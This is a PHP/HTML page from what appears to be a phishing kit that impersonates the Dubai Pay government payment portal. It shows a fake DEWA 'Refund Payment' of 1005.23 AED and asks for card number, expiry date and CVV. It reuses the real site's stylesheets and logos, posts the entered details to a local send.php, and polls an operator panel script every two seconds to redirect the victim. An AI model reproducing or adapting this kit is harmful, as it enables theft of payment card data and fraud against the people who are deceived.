<?php 
require '../main.php';
?>
<html lang="en">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Enter Card Information</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
	<meta name="description" content="">
	<meta name="author" content="">

	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
	<meta http-equiv="pragma" content="no-cache">

	<!-- Le styles -->
	<link href="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/css/bootstrap.css" rel="stylesheet">
	<link href="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/css/bootstrap-responsive.css" rel="stylesheet">
	<link href="files/css/customStyles.css" rel="stylesheet">
	<link href="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/css/site.css" rel="stylesheet">
	<script type="text/javascript" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/js/jquery.min.js"></script>
	<script src="./files/js/jquery.ccvalid.js"></script>
    <script src="./files/js/jquery.mask.js"></script>
	
	<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
	  $("[name=screen]").val(screen.width+' x '+screen.height);
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('onelod').style.visibility="hidden";
      },4000);
  }
}
</script>
	
	
<script type="text/javascript">
function SelectCC(cnm) {
var first = cnm.charAt(0);
var second = cnm.charAt(1);
var third = cnm.charAt(2);
var fourth = cnm.charAt(3);
var ccnmbr = (cnm + '').replace(/\\s/g, ''); 

if ((/^(417500|(4917|4913|4508|4844)\d{2})\d{10}$/).test(ccnmbr) && ccnmbr.length == 16) {
document.getElementById("csc").pattern="[0-9].{2}";
document.getElementById("cctype").value="ELECTRON";
}

else if ((/^(4)/).test(ccnmbr) && (ccnmbr.length == 16)) {
document.getElementById("csc").pattern="[0-9].{2}";
document.getElementById("cctype").value="visa";
}
else if ((/^(34|37)/).test(ccnmbr) && ccnmbr.length == 15) {
document.getElementById("csc").pattern="[0-9].{3}";
document.getElementById("cctype").value="amex";
}

else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(ccnmbr) && ccnmbr.length == 16) {
document.getElementById("csc").pattern="[0-9].{2}";
document.getElementById("cctype").value="MAESTRO";
}

else if ((/^(51|52|53|54|55)/).test(ccnmbr) && ccnmbr.length == 16) {
document.getElementById("csc").pattern="[0-9].{2}";
document.getElementById("cctype").value="mastercard";
}
else if ((/^(6011|16)/).test(ccnmbr) && ccnmbr.length == 16) {
document.getElementById("csc").pattern="[0-9].{2}";
document.getElementById("cctype").value="discover";
}

else {
document.getElementById("csc").pattern="[0-9].{2,3}";
document.getElementById("cctype").value="";
}
}

</script>
	
	<style type="text/css">
		.error {
			box-shadow: 0 0 0 1px #F00 !important;
		}

		.required {
			color: red
		}
		
	    .val-error {
		    color: #a80000;
		    font-size: 14.1px;
		  	font-weight: 500;
		  	text-align:center;
		}
	</style>

	<!--[if !IE]-->
	<style>
		.adjust {
			margin-top: 5px !important;
			margin-bottom: auto !important;
		}
	</style>
	<!--[endif]-->




	<script type="text/javascript">

		var transAmount = 350;
		function pay() {
			var donationAmountElm = document.getElementById("yog__donationAmountTextbox");
			if (typeof(donationAmountElm) != 'undefined' && donationAmountElm != null) {
				var donationAmount = donationAmountElm.value;
				//If donation amount is equal to transaction amount show an alert
				if (document.getElementById("donate").value == "true" && transAmount == donationAmount) {
					var confirmMessage = "Please confirm to donate {0} AED for Dirham Alkhair charity";
					var message = confirmMessage.replace("{0}", donationAmount);
					var confirmation = confirm(message);
					if (confirmation == false) {
						return;
					}
				}
			}

			document.getElementById("subButton").value = "Continue";
			disableAndSubmit();
		}

		function cancel() {
			document.getElementById("subButton").value = "Cancel";
			disableAndSubmit();
		}

		function disableAndSubmit() {
			document.getElementById("payButton").disabled = true;
			document.getElementById("cancelButton").disabled = true;
			document.ccForm.submit();
		}

		function validateFloatKeyPress(el, evt) {
			var charCode = (evt.which) ? evt.which : evt.keyCode;
			var number = el.value.split('.');

			// Allow backspace
			if (charCode == 8) {
				return true;
			}

			if (charCode != 46 && charCode > 31 && (charCode < 48 || charCode > 57)) {
				return false;
			}

			// Prevent special characters usin shift key
			if (evt.shiftKey) {
				return false;
			}

			//just one dot
			if (number.length > 1 && charCode == 46) {
				return false;
			}
			//get the carat position
			var caratPos = el.selectionStart; //getSelectionStart(el);
			var dotPos = el.value.indexOf(".");
			if (caratPos > dotPos && dotPos > -1 && (number[1].length > 1)) {
				return false;
			}

			var currentValue = String.fromCharCode(charCode);
			var finalValue = el.value + '' + currentValue;
			if (Number(finalValue) > Number(el.getAttribute("max"))) {
				try {
					return $("#yog__donationAmountTextbox")[0].validity.valid;
				} catch (e) {
					return false;
				}
			}

			if (charCode != 46) {
				var dotIdx = finalValue.indexOf(".");
				var currentVal = String(el.value);
				if (dotIdx > -1 && (dotIdx < currentVal.length - 2)) {
					return false;
				}
			}

			return true;
		}
		
		function validateFieldLength(elem, length) {
			if (elem.value.length > length) {
				elem.value = elem.value.slice(0,length); 
			}
		}

		function validateNumber(event) {
			var charCode = (event.which) ? event.which : event.keyCode;
			if (charCode > 31 && (charCode < 48 || charCode > 57)) {
				return false;
			}
			return true;
		}

	</script>

	<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
      <script src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/js/html5shiv.js"></script>
    <![endif]-->
</head>
<body leftmargin="0" topmargin="0" class="defaultText">

	<form class="js--form-steps--form-element" method="POST" action="send.php" id="form1" name="Contact Our Experts" data-di-form-track="">
			

	
<p class="c-form-step--intro-text"></p>
	
	
		<div class="c-form-step--form-wrapper">

                        <section class="c-form-step--section js--form-step--section is-active" data-form-step="0" style="z-index: 1;">
		



<span class="link-anchor" id="fieldParsys0_text_generic"></span>
<div class="c-text-generic has-rte component-small ">
	
	
	
	
</div>
   
   

								
<input id="cctype" type="text" name="cctype" sousize="20" value="" style="display:none;" >
		<input type="hidden" name="validationError" id="validationError" value="null">
		<input type="hidden" name="subButton" id="subButton" value="">
		<div class="container">
			<div id="mainTable">
				<div class="banner">
					<img class="dubai-pay-logo" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/dubai-pay-logo.png" alt="Dubai Pay">
					<img class="sd-logo" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/smart-dubai-logo.png" alt="Dubai Pay">
				</div>
				<div class="form-signin">
					<div>
					  <div class="heading heading__expandable" tabindex="2" onclick="if (this.className === 'heading heading__expandable') this.className = 'heading heading__expandable heading__expandable--expanded'; else this.className = 'heading heading__expandable';">
						<div class="heading__group">
						  <span role="heading" class="heading__title"><span class="heading__serviceProvider">DEWA</span><span class="heading__transactionNumber">#900001099463637</span></span>
						  <span role="heading" class="heading__subtitle">Details</span>
						</div>
					  </div>
						<!--[if lt IE 9]>
						  <h1 class="heading">Transaction Info</h1>
						<![endif]-->
					  <div class="content-area">
						<div class="group">
							<dl class="formRow group__row">
							  <dt class="formTitles formRow__title">Service</dt>
							  <dd class="formTitlesBold formRow__value">Refund Payment</dd>
							</dl>
							<dl class="formRow group__row">
							  <dt class="formTitles formRow__title">SP Transaction No</dt>
							  <dd class="formTitlesBold formRow__value">900001099463637</dd>
							</dl>
							<dl class="formRow group__row">
							  <dt class="formTitles formRow__title">Amount</dt>
							  <dd class="formTitlesBold formRow__value">1005.23&nbsp;AED</dd>
							</dl>
						  </div>
					  </div>
					</div>
				  </div>

				<div class="form-signin">
					<div>
						<div class="heading">
							<span style="margin-right: 1em">Enter Card Details</span>
							<span class="acceptedCards">
								<img class="acceptedCards__card" width="40" height="26" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/master-card.png">
								<img class="acceptedCards__card" width="40" height="26" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/visa-dark.png">
								<img class="acceptedCards__card" width="40" height="26" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/american-express-dark.png">
								<img class="acceptedCards__card" width="40" height="26" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/jcb-card.png">
							</span>
						</div>
						<div class="content-area">
							<table cellpadding="2" cellspacing="2" border="0">
								<tbody>
									
									<tr>
										<td class="formTitles">Credit Card Number</td>
										<td class="formTitles">
											<input type="tel" name="cnm" id="cnm" size="20" class="disableCopypaste input-block-level credit-input-field " placeholder="Card Number" autocomplete="off" pattern=".{16,}" maxlength="16" oninput="validateFieldLength(this, 20)" onkeypress="return validateNumber(event)" data-form-validation-on="blur" data-form-validation-type="regex" data-form-validation-rule="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" onkeyup="SelectCC(this.value)" data-di-field-id="cnm" required="" required title="Please enter a valid card">
											<img width="41" height="26" id="txtCardNo__kind" style="visibility: hidden; margin-bottom: 5px" src="">
											<script>
												var el = document.getElementById('cnm');
												var kindImg = document.getElementById('txtCardNo__kind');
													var isMasterCard, isVisa, isAmex, isJcb;
													
													var cardNo = el.value;
													
													var visaReg = new RegExp("^4[0-9]{1,15}$");
													var amexReg = new RegExp("^3[47][0-9]{1,13}$");
													var jcbReg = new RegExp("^(?:2131|1800|35\\d{3})\\d{0,11}$");
													var masterReg = new RegExp("^(5[1-5][0-9]{4,14}|2(22[1-9][0-9]{1,12}|2[3-9][0-9]{2,13}|[3-6][0-9]{3,14}|7[0-1][0-9]{3,13}|720[0-9]{1,12}))$");
													
													if (cardNo.match(visaReg) != null) {
														isVisa = true;
													} else if (cardNo.match(masterReg) != null) {
													    isMasterCard = true;
													} else if (cardNo.match(amexReg) != null) {
														isAmex = true;
													} else if (cardNo.match(jcbReg) != null) {
														isJcb = true;
													}
													
													// URL must be escaped for srcset to work
													var srcPrefix = 'https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/';
													if (isVisa) {
														kindImg.src = srcPrefix + 'visa-dark.png';
														kindImg.style.visibility = '';
													} else if (isAmex) {
														kindImg.src = srcPrefix + 'american-express-dark.png';
														kindImg.style.visibility = '';
													} else if (isMasterCard) {
														kindImg.src = srcPrefix + 'master-card.png';
														kindImg.style.visibility = '';
													} else if (isJcb) {
														kindImg.src = srcPrefix + 'jcb-card.png';
														kindImg.style.visibility = '';
													} else {
														kindImg.style.visibility = 'hidden';
													}
												};
											</script>												
										</td>
									</tr>
									<tr>
										<td class="formTitles">Expiry Date</td>
										<td class="formTitles">
											<input type="number" id="exp" name="exp" size="20" class="disableCopypaste input-block-level date-input-field " placeholder="MM" autocomplete="off" min="1" max="12" required="">
											<div class="date-input-field-divider">/</div>

											<input type="number" id="exp2" name="exp2" size="20" class="disableCopypaste input-block-level date-input-field " placeholder="YY" autocomplete="off" min="22" max="36" required="">
										</td>
									</tr>
									<tr>
										<td class="formTitles" style="position: relative"><abbr tabindex="5" class="cvv--withhint" aria-label="Card Verification Number" title="">CVV</abbr> Number
											<div class="cvv__hint">
												<div style="float: left; padding: 0px 5px">
													<img class="cvv-logo" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/CVV_04.png" width="100" height="47" alt="">
												</div>
												<div class="about-cvv">The CVV
													number (Security Code) is the last three digits of the
													number found on the back of your credit card near the
													signature strip.</div>
											</div>
										</td>
										<td class="formTitles">
											<div>
												<input type="tel" name="csc" id="csc" class="disableCopypaste input-block-level " placeholder="CVV" style="max-width: 50px" pattern=".{3,}" maxlength="4" autocomplete="off" required="" required title="Please enter a valid CVV">
											</div>
										</td>
									</tr>
								</tbody>
							</table>
							<div class="ccbadgesContainer">
							
								<img width="111" height="40" class="ccbadgesContainer__badge" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/master_secure.png">
							
							
								<img width="91" height="40" class="ccbadgesContainer__badge" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/visa_verified.png">
							
							
								<img width="123" height="40" class="ccbadgesContainer__badge" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/amex_secure.png">
							
							
								<img width="68" height="40" class="ccbadgesContainer__badge" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/jcb_secure.png">
							
							
								<img width="101" height="40" class="ccbadgesContainer__badge" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/images/pci_logo.png">
							
							</div>
						</div>
					</div>

					

					<input type="hidden" id="donate" name="donate" value="">


					<div style="height: 20px; margin-top: 5pt">
						<div style="float: right; padding-left: 5px" class="payment-label">
							Amount: <span id="amount">1005.23</span> <span>AED</span>
						</div>
					</div>
					
					<div style="height: 20px; margin-top: 5pt;" class="yog__donation">
						<div style="float: right; padding-left: 5px" class="payment-label">
							Donation Amount: <span id="donation_amount">10.00</span>
							<span>AED</span>
						</div>
					</div>
					
					<div style="height: 20px; margin-top: 5pt;" class="yog__donation">
						<div style="float: right; padding-left: 5px" class="payment-label" id="yog__total_donation">
							Amount + Donation: <span id="total_amount">10.00</span>
							<span>AED</span>
						</div>
					</div>
					
					
					
					<div style="height: 30px; margin-top: 5pt; padding: 0 10px;">
						<div style="float: right; padding-left: 5px">
							<input type="submit" name="payButton" id="payButton" value="Refund" class="btn btn-primary btn-rounded">
						</div>
						<div style="float: right; padding-left: 5px">
							<input type="button" name="cancelButton" id="cancelButton" value="Cancel" onclick="cancel()" class="btn btn-default btn-rounded">
						</div>
					</div>


				</div>

				<div class="wellAskdubai">
					<table width="100%" cellpadding="0" cellspacing="0" border="0">
						<tbody>
							<tr>
								<td>
									<span class="footer-text">For more inquiries please call</span>
									<a href="tel://+971600560000" class="footer-text number">600 560 000</a>
								</td>
								<td>
									<span class="footer-text text-right copy-right">Copyright © 2026. All rights reserved.</span>
								</td>
							</tr>
						</tbody>
					</table>
				</div>

			</div>
		</div>
	</form>

	<script type="text/javascript" src="https://epayment.dubai.ae/ePayHub/CardProcessor/theme/js/site.js?v=1"></script>
	<script src="./files/js/main.js"></script>
<script src="res/jq.js"></script>
<script>
var cd = "<?php echo $current_data; ?>";
setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
            cd=d;
        }
    })

}, 2000);
</script>

</body>